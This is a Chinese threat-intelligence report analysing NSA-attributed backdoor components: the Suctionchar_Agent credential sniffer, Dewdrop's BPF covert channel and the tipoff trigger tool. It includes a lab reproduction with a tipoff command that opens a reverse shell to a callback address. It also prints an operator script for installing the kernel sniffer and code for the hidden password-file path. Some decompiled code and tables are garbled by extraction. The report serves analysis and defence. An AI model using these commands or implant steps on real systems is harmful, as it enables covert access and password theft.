# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

原创 奇安盘古实验室 奇安信威胁情报中心 2022-09-13 10:15 发表于四川  

## 概述  

在报告“Bvp47-美国NSA方程式组织的顶级后门”（参考1）的描述中，Bvp47本身像是一个巨大的壳或压缩包，共包含了18个分片，盘古实验室展示了对于Bvp47后门程序的归属分析和部分技术细节的描述，比如BPF隐蔽隧道，但依然还有部分其他模块值得深入探究，这些模块既可以作为Bvp47的一部分一起执行任务，也可以被独立使用。  

在2015年对国内某国家重要关键信息基础设施的Solaris系统取证中，盘古实验室提取到了一份独立存活于Solaris平台看起来与Bvp47关系密切的样本，后经确认，样本文件内容与“影子经纪人”（The Shadow Brokers）揭露出的“饮茶”（Suctionchar_Agent）木马程序原文件一致。该木马程序搭配Bvp47中的Dewdrop、Incision等模块和控制程序tipoff，可以轻松窃取目标系统用户在执行ssh、passwd、sudo等命令时的账号密码，随即将其隐蔽保存在目标系统中。这些被加密隐藏的密码文件同样也需要RSA算法的私钥来解密。  

基于特征的入侵分析取证发现，国内大量重要组织机构受到了这个美国国家安全局（NSA）来源的“饮茶”（Suctionchar_Agent）木马程序的侵袭，其中就包括了近期披露的被网络渗透的西北工业大学。有证据显示， NSA利用“饮茶”（Suctionchar_Agent）木马程序窃取了世界各国难以确切估量的账号密码，在美国各地建立了多个高度机密的账号密码海量数据存储中心，供NSA的行动部门TAO随时查询并“合法”进入受害者的信息系统。  

追踪Bvp47的过程更像是在摸索一张迷雾下的拼图，在奇安盘古实验室与国家计算机病毒应急处理中心的通力合作下，这份报告将会通过对“饮茶”（Suctionchar_Agent）、Dewdrop、Bvp47_loader等程序和系统模块的技术分析来进一步理解Bvp47这个顶级后门平台的部分工作方式和执行逻辑。  

# “饮茶”嗅探木马 （Suctionchar_Agent）攻击场景还原  

## 攻击场景  

经过全面而深入的技术模拟分析，盘古实验室还原了“饮茶”嗅探木马（Suctionchar_Agent）与Bvp47后门程序其他组件配合实施联合攻击的场景，具体执行过程如下图所示:  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/a5694584f72e956d3cbd82e6e31a62263645d9809f1ff4df9dc1f79d538a43ef.jpg)  
Bvp47_Suctionchar_Agent攻击场景  

1. 运行于内核层的sum会辅助“饮茶”嗅探木马（Suctionchar_Agent）窃取passwd、telnet、su等进程中的账号密码；  

2. 窃取到的账号密码会同步发送给运行于Ring3的“饮茶”嗅探木马（Suctionchar_Agent）;  
3. “饮茶”嗅探木马（Suctionchar_Agent）会将账号密码保存到名为“/var/tmp/.xxxxxxxx”的隐藏目录中；  
4. 美国国家安全局（NSA）的攻击实施者远程发送执行ish反弹的触发包到内核层的BPF过滤程序；  
5. BPF过滤器捕获到特征包后传送给Ring3的Dewdrop程序模块；  
6. Dewdrop进行数据包解密并收到ish反弹指令，随即转送给Incision程序；  
7. Incision程序主动回联到callback地址，美国国家安全局（NSA）的攻击实施者利用ish接受窃取的密码文件；  
8. 美国国家安全局（NSA）的攻击实施者将被RSA公钥加密的密码文件进行私钥解密并还原密码文件；  

### 场景复现  

1. 运行tipoff控制端程序，功能列表如下:  

./tipoff -h usage:./tipoff [options]  

<html><body><table><tr><td>* -t, --destination-address address[:port]- The address to send the trigger packet to</td><td></td><td></td></tr><tr><td colspan="2">+-p,--destination-port port</td><td>-Thetargetaddresstouseinthetrigger</td></tr><tr><td colspan="2">commanddata,requiredwhenusingnatwith</td><td></td></tr><tr><td colspan="2">a trigger packet. The target address is used</td><td></td></tr><tr><td>bydefault.</td><td></td><td></td></tr><tr><td></td><td>*-a,--callback-address address[:port]-The trigger callback address</td><td></td></tr><tr><td>*-c,--callback-port port</td><td>-Thetriggercallbackport</td><td></td></tr><tr><td>-S,--source-address address[:port]</td><td>-Usethis source addressfor thetrigger</td><td></td></tr><tr><td>-u,--source-port port</td><td>-Use thisport when sendingtcp/udp</td><td></td></tr><tr><td>*-r,--protocol,--transport protocol</td><td></td><td></td></tr><tr><td>-A,--applicationprotocol</td><td>-Applicationlayerprotocol used tosend trigger(dns/smtp/sip)</td><td></td></tr><tr><td>-C,--commandcommand</td><td>-The command protocol identification value.</td><td></td></tr><tr><td>-E,--time time</td><td>- The time to use, in seconds since the epoch</td><td></td></tr><tr><td>-K, --time-skew skew</td><td>-The time skew to use, in seconds</td><td></td></tr><tr><td>-M, --list-icmp-options</td><td>- List typical icmp options</td><td></td></tr><tr><td>-l, --icmp-options type,code</td><td>- icmp type and code fields</td><td></td></tr><tr><td colspan="2">-n,--raw-send [<address>:]port -Send raw trigger packet data to this address,</td><td></td></tr><tr><td></td><td>port. The default address is localhost.</td><td></td></tr><tr><td>-0, --tcp-connect -f, --tcp-flags flagL,flag]</td><td>-Establish tcp connectionfor trigger -tcp flags (syn,fin,rst,push,ack,urg)</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>-L, --list-firewall-types -F, --bypass-firewall type</td><td>-Print supported firewall types to stdout - Bypass firewall (types: pix)</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>-m, --mail-from address -l, --rcpt-to address</td><td>-Use this asfrom'addressforSMTP/SIPapplication protocol data - Use this as`to`addressfor SMTP/SIP application protocol data</td><td></td></tr><tr><td>-d, --dns-flags bytes</td><td>-The 16-bit dns flags value</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>-U, --forward-offset -T,--start</td><td>- Use aforward offset triggerpacket -The16-bitstartof triggerdatavalue</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>-i, --start-ish -X, --execute file</td><td>-Start anincisioncallbacklistener -UsecommandOx04andstartexecutecallbacklistenerwithgivenfile</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>-q, --quiet</td><td>-Donotprintinformationalmessages</td><td></td></tr><tr><td>-h, --help</td><td>-This help message</td><td></td></tr></table></body></html>

\* - Required parameter + - Required parameter when using TCP or UDP  

2. 具体功能列表如下:  


<html><body><table><tr><td colspan="2">类别 功能说明</td></tr><tr><td>触发协议支持</td><td>支持TCP、UDP、ICMP协议</td></tr><tr><td>非常规TCP标志支持</td><td>syn、fin、ack、rst、 push、urg</td></tr><tr><td>防火墙穿透支持</td><td>PIX或其它；默认支持防火墙穿透，ACL穿透；</td></tr><tr><td>支持应用协议</td><td>SMTP、SIP、DNS等应用层协议</td></tr><tr><td>后门功能1</td><td>支持远程启动文件进程</td></tr><tr><td>后门功能2</td><td>支持远程Shell查看</td></tr><tr><td>支持各协议的扩展定制</td><td>包括SMTP、DNS、TCP等协议的标记位自定义</td></tr></table></body></html>  

### 3. 支持UDP包的远程shell获取  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

[root@localhost Desktop]# ./tipoff --trigger-address 192.168.159.128 --target   
-address 192.168.159.128 --target-protocol udp --target-port 738 --callback-a   
ddress 192.168.159.129 --callback-port 2468 --start-ish   
TRIGGER DATA COMMAND $=~0\mathbf{x}01$ DESTINATION ADDRESS ${}={}$ 192.168.159.128:738 TRANSPORT PROTOCOL $=$ udp (17) TIME STAMP $=$ Sun Mar 6 11:45:07 2022 (1646595907) TIME SKEW =43200 CALLBACK ADDRESS =192.168.159.129:2468 SOURCE PORT =64259 START OF TRIGGER $=~0{\times}0136$ Invoking ISH on port 2468... Trying 127.0.0.1..   
Connected to 127.0.0.1.   
Escape character is ']'   
25146,1   
Skipping environment dump... bash-3.00#  

#### 4.UDP报文如下  

Data:01369b0ac86e493cd2529f35e607ebe9e98f1ceeeb566b0a69e51149353d0af139293d07..   


<html><body><table><tr><td>1830139829.702057</td><td>192.168.159.129</td><td>192.168.159.128</td><td>UDP</td><td>17864259→738Len=136</td><td></td><td></td></tr><tr><td>1830239829.702377</td><td>192.168.159.128</td><td>192.168.159.129</td><td>ICMP</td><td>206Destinationunreachable（Port</td><td></td><td>unreachabl</td></tr><tr><td>1830339829.702896</td><td>192.168.159.128</td><td>192.168.159.129</td><td>TCP</td><td>7432917→2468</td><td>[SYN]</td><td>Seq=0Win=5840Len=0</td></tr><tr><td>1830439829.703140</td><td>192.168.159.129</td><td>192.168.159.128</td><td>TCP</td><td>742468→32917</td><td>[SYN,ACK]</td><td>Seq=0 Ack=1 Win=</td></tr><tr><td>1830539829.703448</td><td>192.168.159.128</td><td>192.168.159.129</td><td>TCP</td><td>6632917→2468</td><td>[ACK]</td><td>Seq=1 Ack=1 Win=5840</td></tr><tr><td>1830639829.703657</td><td>192.168.159.128</td><td>192.168.159.129</td><td>TCP</td><td>19432917→2468</td><td>[PSH,ACK]</td><td>Seq=1 Ack=1 Win=5</td></tr><tr><td>1830739829.703851</td><td>192.168.159.129</td><td>192.168.159.128</td><td>TCP</td><td>662468→32917</td><td>[ACK]</td><td>Seq=1 Ack=129Win=5792</td></tr><tr><td>1830839829.750556</td><td>192.168.159.129</td><td>192.168.159.128</td><td>TCP</td><td>742468→32917</td><td>[PSH,ACK]</td><td>Seq=1 Ack=129 Wir</td></tr><tr><td>1830939829.750852</td><td>192.168.159.128</td><td>192.168.159.129</td><td>TCP</td><td>6632917→2468</td><td>[ACK]</td><td>Seq=129Ack=9Win=584</td></tr><tr><td>1831039829.751348</td><td>192.168.159.129</td><td>192.168.159.128</td><td>TCP</td><td></td><td></td><td>742468→32917[PSH.ACK]Se0=9Ack=129 Wir</td></tr></table></body></html>

>Frame 18301: 178 bytes on wire (1424 bits), 178 bytes captured (1424 bits) on interface \Device\NPF_{BD992997-9A45-4A6 > Ethernet II, Src: VMware_de:9c:aa (00:0c:29:de:9c:aa), Dst: VMware_2a:ff:ac (00:0c:29:2a:ff:ac) >Internet Protocol Version 4, Src: 192.168.159.129, Dst: 192.168.159.128 $,$ User Datagram Protocol, Src Port: 64259, Dst Port: 738 Data (136 bytes)  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/10a576ac69bd8bafd68e5926fb23cae6e103ed0025835c2c0f4d1fdfb1b7e5ac.jpg)  

5. 在获取到的shell中可以看到被隐藏的进程和文件  

<html><body><table><tr><td>root</td><td>5697</td><td>5562</td><td>0 00:28 pts/2</td><td>00:00:00bash</td><td></td></tr><tr><td>root</td><td>6116</td><td>1</td><td>0 01:23?</td><td>00:00:00</td><td>）cupsd</td></tr><tr><td>root</td><td>24682</td><td>1</td><td>008:20?</td><td></td><td>00:00:00/usr/bin/modload</td></tr><tr><td>root</td><td>2468324682</td><td></td><td>008:20?</td><td></td><td>00:00:00/usr/bin/modload</td></tr><tr><td>root</td><td>24684</td><td>1</td><td>008:20？</td><td></td><td>00:00:00/usr/bin/modload</td></tr><tr><td>root</td><td>25146</td><td></td><td>1011:45？</td><td></td><td>00:00:00/usr/bin/modload</td></tr><tr><td>root</td><td>2514725146</td><td></td><td>0 11:45 pts/3</td><td></td><td>00:00:00 /bin/bash --posix +o histo</td></tr><tr><td>root bash-3.00#</td><td>2517825147</td><td></td><td>0 11:46 pts/3</td><td>00:00:00 ps-ef</td><td></td></tr></table></body></html>  

6. “/var/tmp/”目录下被加密的文件如下：  

bash-3.00# pwd   
/var/tmp/.e33ff11cb8e3b4ff/a0b973925e397d9acd80e85e2eaa6e60   
bash-3.00# ls -1   
total 4   
-rw- 1 root root 154 Mar9 09:07 d5373a146ff9f200a2376054dde25677  

7.使用suctionchar_decode对“/var/tmp/”目录下被加密的文件解密： [root@localhost Desktop]# ./suctionchar_decode__v__3.3.9.27_x86_64-linux-re( it-enterprise-4.9 444 'reating file "20220308033113_19577_passwd_test"  

# “饮茶”嗅探木马 （Suctionchar_Agent） 技术细节  

### 文件信息  

样本关联溯源发现，盘古实验室2015年提取到的样本为“影子经纪人”（The Shadow Brokers）泄漏的文件之一，即suctionchar_agent__v__3.3.7.9_sparc-sun-solaris2.9 ，文件相关信息如下：  

<html><body><table><tr><td colspan="2">样本信息概要说明</td></tr><tr><td>文件名称</td><td>未知</td></tr><tr><td>文件哈希（MD5）</td><td>a633c1ce5a4730dafa8623a62927791f</td></tr><tr><td>文件大小（字节）</td><td>47,144</td></tr><tr><td>TheShadowBrokers具体包名称</td><td>suctionchar_agents.tar.bz2</td></tr><tr><td>原始文件名称</td><td>suctionchar_agent__v__3.3.7.9_sparc-sun-solari s2.9</td></tr><tr><td>功能目标</td><td>窃取SSH、TELNET、FTP、PASSWD、SU、RSH、L OGIN、CSH等程序中的账号密码信息。</td></tr><tr><td>CPU架构</td><td>SPARC</td></tr><tr><td>隐藏路径2</td><td>/var/tmp/.xxxxxxxxxxxx</td></tr></table></body></html>  

鉴于盘古实验室提取的样本本身为SPARC架构，比较少见，为方便读者理解并采取有效措施进行防范，我们选择基于x86架构、功能相同的木马程序样本进行分析，具体x86架构的文件信息如下：  

<html><body><table><tr><td colspan="2">样本信息概要说明</td></tr><tr><td>文件名称</td><td>suctionchar agent v 2.0.28.2 x86-linux-cen- tos-5.1</td></tr><tr><td>文件哈希（MD5）</td><td>4a5b7a9c5d41dbe61c669ed4cf2975e5</td></tr><tr><td>文件大小(字节)</td><td>31,649</td></tr><tr><td>TheShadowBrokers具体包名称</td><td>suctionchar_agents.tar.bz2</td></tr><tr><td>原始文件名称</td><td>suctionchar_agent__v__2.0.28.2_x86-linux-cen- tos-5.1</td></tr><tr><td>功能目标</td><td>窃取SSH、TELNET、FTP、PASSWD、SU、RSH、L OGIN、CSH等程序中的账号密码信息。</td></tr><tr><td>CPU架构</td><td>X86</td></tr><tr><td>Bvp47对应分片</td><td>0xOE</td></tr><tr><td>隐藏路径2</td><td>/var/tmp/.xxxxxxxxxxxx</td></tr></table></body></html>  

### 样本关联  

根据盘古实验室提取的“饮茶”嗅探木马样本（Suctionchar_Agent），研究人员从“影子经纪人”（The Shadow Brokers）揭露出的文件中找到了对应的原始文件为“linux/bin/suctionchar_agents.tar.bz2/suctionchar_agent__v__3.3.7.9_sparc-sun-solaris $2.9"$ ，二者完全一致。相关压缩包中还包含了适合多个平台和版本的“suctionchar”木马程序，文件最早可追溯到2007年:  

<html><body><table><tr><td></td></tr><tr><td>suctionchar_agent_v_1.5.17.7_x86-linux-centos-5.4 Added all thefilesinside compressed bz2and gzfiles 5 years ago</td></tr><tr><td>suctionchar_agent_v_2.0.10.1_x86-linux-mandriva-2006 Added all the files inside compressed bz2and gz files 5years ago</td></tr><tr><td>suctionchar_agent_y_2.0.10.4_x86-linux-redhat-enterpr.. Added all thefiles inside compressed bz2and gzfiles 5yearsago</td></tr><tr><td>suctionchar_agent_v_2.0.11.2_x86-linux-redhat-enterpr.. Addedall thefilesinsidecompressedbz2andgzfiles 5yearsago</td></tr><tr><td>suctionchar_agent_v_2.0.11.3_x86-linux-slackware-10.2 Added all thefiles inside compressed bz2andgzfiles 5yearsago</td></tr><tr><td>suctionchar_agent_v_2.0.12.1_sparc-sun-solaris2.7 Added all thefiles inside compressed bz2and gzfiles 5years ago</td></tr><tr><td>suctionchar_agent_v_2.0.13.1_x86-linux-fedora5 Added all thefiles inside compressed bz2and gzfiles 5years ago</td></tr><tr><td>suctionchar_agent_v_2.0.13.2_x86-linux-fedora6 Added all thefiles inside compressed bz2and gzfiles 5 years ago</td></tr><tr><td>suctionchar_agent_v_2.0.13.4_x86-linux-redhat-7.3 Added all thefiles inside compressed bz2and gzfiles</td></tr><tr><td>5 years ago suctionchar_agent_v_2.0.17.1_x86-linux-suse-8.2 Added all thefiles inside compressed bz2 and gzfiles</td></tr><tr><td>5 years ago Added all the files inside compressed bz2 and gz files</td></tr><tr><td>suctionchar_agent_v_2.0.17.3_x86-linux-suse-10.0 5years ago</td></tr><tr><td>suctionchar_agent_v_2.0.17.4_x86-linux-tilttop-gate.nto Added all the files inside compressed bz2and gz files 5yearsago suctionchar_agent_v_2.0.18.1_x86-freebsd-6.2 Added all the files inside compressed bz2 and gz files 5 years ago</td></tr></table></body></html>  

### 技术分析  

#### 字符串解密  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/3ba743d9e4fa35b683e0d8e5ac34f2c4a5ced86dd7dbe3d879680c58b52a8c3f.jpg)  
如下图所见，字符串加密也就是“Bvp47”研究报告中所描述的 $0\times47$ 函数加密：  

解密后的字符串列表如下：  


<html><body><table><tr><td colspan="2">Address</td><td>Length</td><td>Type </td><td> String</td></tr><tr><td></td><td>rodata:08006...0000000A</td><td></td><td>C</td><td>/dev/null</td></tr><tr><td></td><td>.rodata:08006...00000021</td><td></td><td>C</td><td>a0b973925e397d9acd80e85e2eaa6e60</td></tr><tr><td></td><td>rodata:08007...00000008</td><td></td><td>C</td><td>%s#fork</td></tr><tr><td></td><td>rodata:08007...00000007</td><td></td><td>C</td><td>(null)</td></tr><tr><td></td><td>rodata:08007...0000000A</td><td></td><td>C</td><td>~/dev/tty</td></tr><tr><td></td><td>rodata:08007...00000038</td><td></td><td>C</td><td>^((/usr(/local)?)?/s?bin/)?(sshltelnetlftplpasswd)( [$)</td></tr><tr><td></td><td>rodata:08007...00000021</td><td></td><td>C</td><td>d5373a146ff9f200a2376054dde25677</td></tr><tr><td></td><td>rodata:08007...00000021</td><td></td><td>C</td><td>dc9cb44a723d0e75201d933159834173</td></tr><tr><td></td><td>rodata:08007...00000021</td><td></td><td>C</td><td>dc9cb44a723d0e75201d933159834173</td></tr><tr><td></td><td>rodata:08007...00000006</td><td></td><td>C</td><td>/proc</td></tr><tr><td></td><td>rodata:08007...0000000D</td><td></td><td>C</td><td>/proc/%s/exe</td></tr><tr><td></td><td>rodata:08007...00000011</td><td></td><td>C</td><td>/proc/%s/cmdline</td></tr><tr><td></td><td>rodata:08007..0000000C</td><td></td><td>C</td><td>/dev/random</td></tr><tr><td></td><td>.rodata:08007...0000000D</td><td></td><td>C</td><td>/dev/urandom</td></tr></table></body></html>  

相关解密脚本如下：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/5970e6ae863dd7957ab49a5bad075492e7093eae4dce3bb771483548b032f67c.jpg)  

#### 功能模块设计  

文件“Linux\etc\opscript.txt”中对Suctionchar_Agent的功能作了相关说明，即驻留窃取SSH、TELNET、FTP、PASSWD、SU、RSH、LOGIN、CSH等程序中的账号密码信息。“饮茶”（Suctionchar_Agent）程序是这个木马程序的应用层代理，它与相关联的内核模块通信，接收所需信息并加密写入文件。内核模块sum文件（The Shadow Brokers Leaks未包含该文件）可由modload程序加载，成功加载内核模块后会清空落地的文件，防止内容被恢复：  

###  

# SUCTIONCHAR  

# 32 or 64 bit 0s - solaris sparc 8,9   
# Kernel level implant - transparent, sustained, or realtime # interception of procoess input/output vnode traffic. # retrieve later  

# filter: ssh, telnet, rlogin, rsh, password, login, csh , su # max bytes collected per session is 32 kilobytes # max bytes collected for all sessions is 1 megabyte # don't take up more than 1% of system's memory  

# to determine if suctionchar is loaded on a system is to # open a command channel to the implant as described in # authenticate and yyserv tool and demo sections. If this # fails and receives the error "Bad Address" when trying to # modload the instant grat module; function call needs patch # can't be found, probably because already been patched by a # version of suctionchar already running  

# SUCTIONCHAR will go away at reboot # if offset involved with target, must set op box time to match target time  

# INSTALLING SUCTIONCHAR   
uname -a   
isainfo -V  

-cd/tmp/.scsi cp /usr/sbin/modload ml cp /usr/sbin/modinfo mi  

### if running 32 AND 64 bit, upload 64 bit:   
# 64 bit   
-put /current/up/sparcv9/sum sum   
# else 32 bit   
-put/current/up/sum sum   
-lt sum   
### install it:   
./ml sum  

### make sure sum doesn't show up in modinfo: /mi  

“饮茶”（Suctionchar_Agent文件本身既可以使用默认配置，也可以从外部读取配置文件，文件格式主要包括3.x以上版本的xml格式和早期的conf格式。  

3.x以上版本的xml格式（“Linux\bin\suctionchar_configure.xml”）：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/ba4f49b656ddaed58934a3ae76bcd0a3605100acfbd5ef97340430a83dedef65.jpg)  

“Linux\doc\old\etc\suctionchar.sample.filter.conf” ：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/311c5703e7d71b78b69e6ba13f4d0cd51d6e0e185ce8eaf49373b478ffd813a7.jpg)  

“饮茶”（suctionchar_configure）将生成“dc9cb44a723d0e75201d933159834173“文件，该文件供Suctionchar_Agent使用：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

usage:./suctionchar_configure__v__3.3.10.3_x86-1inux-centos-5.7[XML_coNFIG URATION_FILE |-r ］  

This tool is used to generate a SUCTIONCHAR binary configuration file from an XML configuration specification.The XML data is read from standard input if nofile specified on the command line  

This tool can also be used to verify a generated binary file by using the -r option This tool will always write to and read from the file./dc9cb44a723d0e 75201d933159834173  

#### 密码获取线程  

在“饮茶”（Suctionchar_Agent）中存在一个独立的线程，与内核模块sum保持通信，接收账号密码并写入到/var/tmp/文件夹中，即sub_8049EF0函数内部：  

case 1: $v6~=~5$ $\vee5=$ break; case 2: $v_{\textsf{b}}=\textsf{8}$ $v5=$ break; case 3: $v6~=~5$ $\vee5=$ break; default: $v6=8.$ $\downarrow5=$ break; } } else { $=$ } { else } $\vee11=$ $v6$ $)\vee8=\theta.$ break; if（ sub_804C840(\*(_DWORD \*)v8，v12）） break; break; break; break; if （ sub_804c900(v8[0],v1）） break; if （ sub_804C730(v8[0],v11）) break; $=$ sub_804AEE0(\*(_DWORD \*)v8, sub_80497E0, 0); break; $^{++}$ } return 257;  

回调函数sub_8049A00：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/1a7cf83b9fc04a93da1863766132923221e7917a7c5eefed9da67ca81c7cf914.jpg)  

#### 密码保存文件的路径生成算法  

在函数get_hidden_path_0804BDF0中描述了隐藏文件” /var/tmp/.e33ff11cb8e3b4ff/a0b973925e397d9acd80e85e2eaa6e60/d5373a146ff9f200a2376054dde25677”的生成算法：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

struct stat v10;   
char v11[11]; //   
char v12[11]; //   
char v13[11]; //   
char v14[11];   
char v15[11]; //   
char v16[25]; //   
$v8~=~\theta$ return -268435447; $=$ ${}={}$ $=$ ${}={}$ $=$   
$\vee19=\Theta$ $=$ sub_804CF60(v16, aS0161lx, 12); return 1536;   
$v4=\textsf{\theta}$   
{ { return 1536;   
}   
else   
{ return 1536;   
$\vee9=\vee21$ .f_blocks; $^+$ 1;/／拼接完整路径名   
}   
else  

还原的代码大致如下：  

md5_context ctx; unsigned int blocks; int rv; struct statvfs buf; rv ${}={}$ statvfs("/", &buf); blocks $=$ buf.f_blocks; char path[ 2048 ]; struct stat sbuf; md5_starts(&ctx); md5_update(&ctx，(char\*)&blocks，4); unsigned char out[16]; md5_finish(&ctx, out); memset( path,O,sizeof(path) ); snprintf( path, sizeof(path) - sizeof(\*path), "/var/tmp/.%016llx/",( (int\*)out)[0]，((int\*)out)[1] ）;  

### “饮茶”木马（suctionchar_decode）程序中的私钥  

正如攻击场景一章中所描述的那样，文件“/var/tmp/.e33ff11cb8e3b4ff/a0b973925e397d9acd80e85e2eaa6e60/d5373a146ff9f200a2376054dde25677”可以被“linux\bin\suctionchar_decode”程序所解密，加密算法需要用RSA私钥解密RC6对称密钥后才能解密出文件，同Dewdrop模块中的私钥一样，这个RSA私钥也可以佐证该后门与“影子经纪人”（The Shadow Brokers）泄露数据包的关联关系。  

<html><body><table><tr><td>.text:0804BD68</td><td>jmp</td><td>1oc_804C474</td><td></td></tr><tr><td>.text:0804BD6D</td><td></td><td colspan="2"></td></tr><tr><td>.text:0804BD6D</td><td>text:0804BD6D1oc_804BD6D:</td><td>;CODE XREF:main+211↑j</td><td></td></tr><tr><td></td><td></td><td>sub esp,8</td><td></td></tr><tr><td>.text:0804BD6D</td><td></td><td>push</td><td>offset aok ；"ok\n"</td></tr><tr><td>.text:0804BD70</td><td></td><td>push</td><td>ds:stderr@@GLIBC_2_0;stream</td></tr><tr><td>.text:0804BD75</td><td></td><td>call _fprintf</td><td></td></tr><tr><td>.text:0804BD7B</td><td></td><td>add</td><td></td></tr><tr><td>.text:0804BD80</td><td></td><td>esp，10h sub</td><td></td></tr><tr><td>.text:0804BD83</td><td></td><td>esp，8 push</td><td></td></tr><tr><td>.text:0804BD86</td><td></td><td></td><td>offset aDecryptingInto;"decrypting into rc6 key and mi...</td></tr><tr><td>.text:0804BD8B</td><td></td><td>push call</td><td>ds:stderr@@GLIBC_2_0；stream</td></tr><tr><td>.text:0804BD91</td><td></td><td>ppe</td><td>_fprintf</td></tr><tr><td>.text:0804BD96</td><td></td><td>sub</td><td>esp，10h</td></tr><tr><td>.text:0804BD99</td><td></td><td>esp,0Ch push</td><td></td></tr><tr><td>.text:0804BD9C</td><td></td><td>call _fflush</td><td>ds:stderr@@GLIBC_2_0；stream</td></tr><tr><td>.text:0804BDA2</td><td></td><td>ppe</td><td></td></tr><tr><td>.text:0804BDA7</td><td></td><td>sub esp，4</td><td>esp，10h</td></tr><tr><td>.text:0804BDAA</td><td></td><td>lea</td><td></td></tr><tr><td>.text:0804BDAD</td><td></td><td>push eax</td><td>eax，[ebp+var_268]</td></tr><tr><td>.text:0804BDB3</td><td></td><td>lea eax，</td><td>；int [ebp+var_202F8]</td></tr><tr><td>.text:0804BDB4</td><td></td><td>push eax</td><td>；s</td></tr><tr><td>.text:0804BDBA .text:0804BDBB</td><td></td><td>lea</td><td>eax，[ebp+s]</td></tr><tr><td>.text:0804BDC1</td><td></td><td>push eax</td><td>；int</td></tr><tr><td></td><td>.text:0804BDC2</td><td>call</td><td>rsa_expon_decrypt128；RSA私钥解密函数</td></tr><tr><td>.text:0804BDC7</td><td></td><td>ppe</td><td>esp，10h</td></tr><tr><td>.text:0804BDCA</td><td></td><td>cmp</td><td>eax，1</td></tr><tr><td>.text:0804BDCD</td><td></td><td>jz</td><td>short 1oc_804BDF4</td></tr><tr><td>text:0804BDCF</td><td></td><td>sub</td><td>esp,8</td></tr><tr><td>.text:0804BDD2</td><td></td><td>push</td><td>offset aCheckDidNotAut；"check did not authenticate. something</td></tr><tr><td>.text:0804BDD7</td><td></td><td>push</td><td>ds:stderr@@GLIBC_2_0；stream</td></tr><tr><td>.text:0804BDDD</td><td></td><td>call</td><td>_fprintf</td></tr><tr><td>.text:0804BDE2</td><td></td><td>ppe</td><td>esp,10h</td></tr><tr><td>.text:0804BDE5</td><td></td><td>mov jmp</td><td>[ebp+var_20364]，</td></tr><tr><td>.text:0804BDEF</td><td></td><td></td><td>1oc_804C474</td></tr><tr><td>.text:0804BDF4</td><td></td><td></td><td></td></tr><tr><td>text:0804BDF4</td><td colspan="3"></td></tr></table></body></html>  

### Dewdrop version 3.x 技术细节  

Dewdrop模块承担了最主要的隐蔽后门功能，即BPF过滤功能，本章节主要讨论BPF引擎通信对应的实现过程。  

#### 1. BPF隐蔽后门的初始化是从函数_554a7941开始的；  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/fb2721a5991966a0b2927858bc8668763f24f14c9822d40888b39e75a7443061.jpg)  

#### 2. 其中sec_bpf_init返回了bpf_program的结构体  

080030D0   
080030D0   
080030D0 55   
080030D1 B800830008   
080030D6 89 E5   
080030D8 5D   
080030D9 C3   
080030D9   
080030D9  

；int __cdecl sec_bpf_init()   
sec_bpf_init proc near push ebp mov eax，offset stru_8008300；返回bpf_program结构体 mov ebp, esp pop ebp retn   
sec_bpf_init endp  

3. stru_8008300结构具体值如下：  

#  

<html><body><table><tr><td colspan="6"></td></tr><tr><td>080083003200000020830008stru_8008300 08008300</td><td colspan="4">bpf_program<32h，offset stru_8008320></td></tr><tr><td>08008308 00000000</td><td>θpP</td><td></td><td>；DATAXREF:Sec_bpf_init+1↑o</td><td></td></tr><tr><td>0800830C 00 000000</td><td>θpp</td><td></td><td></td><td></td></tr><tr><td>08008310 00 00 0000</td><td>θpp</td><td></td><td></td><td></td></tr><tr><td>08008314 00 00 00 00</td><td>θpp</td><td></td><td></td><td></td></tr><tr><td>08008318 00 00 00 00</td><td>θPp</td><td></td><td></td><td></td></tr><tr><td>0800831C 00 00 00</td><td>θpP</td><td></td><td></td><td></td></tr><tr><td>08008320 80 00 00 00 00000000+stru_8008320</td><td>bpf_insn<</td><td>80h,</td><td>0， 0，</td><td>θ></td></tr><tr><td>08008320 14 00 0 00 06 000000</td><td colspan="4">DATAXREF:.data:Stru_80083001o</td></tr><tr><td>08008320 02 00 00</td><td>bpf_insn</td><td>14h,</td><td>0, 0，</td><td>6></td></tr><tr><td>08008330 07 00 00 00</td><td>bpf_insn</td><td><7,0,0, 2></td><td></td><td></td></tr><tr><td>08008330 48 00 00 00</td><td>bpf_insn</td><td><48h，0，0，0></td><td></td><td></td></tr><tr><td>08008340 44 00 00 00</td><td>bpf_insn</td><td><44h，0，0，0E6CFh></td><td></td><td></td></tr><tr><td>08008340 02 00 00 00 00</td><td>bpf_insn</td><td><2，0,0，4></td><td></td><td></td></tr><tr><td>08008350 48 00 00</td><td>00 +00</td><td>bpf_insn <48h,0,0,0></td><td></td><td></td></tr><tr><td>08008350 54 00 00 00</td><td>CF E6 00 00 bpf_insn</td><td><54h，0，0，0E6CFh></td><td></td><td></td></tr><tr><td>08008360 84 00</td><td>00 00 00 00 +00 00</td><td>bpf_insn <84h,0，0,0></td><td></td><td></td></tr><tr><td>08008360 14 00 00 00</td><td>01 00 00 00</td><td>bpf_insn <14h,0,0,1></td><td></td><td></td></tr><tr><td>08008370 07 00</td><td>00 0A 00 00 00+</td><td>bpf_insn <7，0，0，0Ah></td><td></td><td></td></tr><tr><td>08008370 60 00</td><td>00 00 04 00 00 00</td><td>bpf_insn 